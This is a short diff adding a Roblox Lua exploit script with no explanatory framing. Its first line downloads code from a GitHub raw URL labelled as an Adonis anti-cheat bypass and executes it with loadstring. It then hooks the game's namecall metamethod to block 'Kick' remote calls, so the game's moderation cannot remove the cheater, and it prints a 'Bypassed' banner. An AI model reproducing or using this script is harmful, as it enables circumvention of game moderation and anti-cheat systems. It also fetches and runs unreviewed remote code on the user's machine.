@@ -1,0 +1,10 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ScripterNumber/Scripts/refs/heads/main/AdonisBypassByCreatysm'))()
+local Namecall
+Namecall = hookmetamethod(game, '__namecall', function(self, ...)
+if getnamecallmethod() == 'FireServer' and self.Name == "Kick" then
+print(self.Name)
+return
+end
+return Namecall(self, ...)
+end)
+print('Bypassed Massacre By Creatysm!')
